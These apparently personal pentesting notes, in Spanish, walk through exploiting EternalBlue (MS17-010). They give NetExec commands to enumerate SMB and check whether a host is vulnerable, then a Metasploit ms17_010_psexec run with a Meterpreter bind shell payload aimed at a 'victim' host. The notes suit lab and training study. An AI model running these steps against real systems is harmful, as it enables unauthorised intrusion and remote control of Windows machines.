# EternalBlue

Tags: #SMB #EternalBlue 

```bash 
❯ nxc smb IP     # Enumerar el servicio SMB 

# Resultados:
	- Signing:True    = El firmado SMB es obligatorio. Olvidate del SMB relay contra este host.
	- SMBv1:True      = La máquina tiene habilitado SMBv1, un protocolo que debería estar muerto desde el 2017. Es la superficie de EternalBlue (MS17-010). 
	- Null Auth:True  = Acepta sesión nula (login anónimo)
```

```bash 
❯ nxc smb IP -u '' -p '' -M ms17-010    # Verificar si es vulnerable a EternalBlue
```

## Explotar Metasploit 

```bash 
# Este si funciona para sistemas de x86 y x64
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/smb/ms17_010_psexec          # Usamos el exploit
	❯ options
	❯ set payload windows/x64/meterpreter/bind_tcp
	❯ set LHOST ❮IP❯                                   # Colocamos la IP de nuestra maquina 
	❯ set RHOSTS ❮IP❯                                  # Colocamos la IP de la maquina victima
	❯ exploit 
```

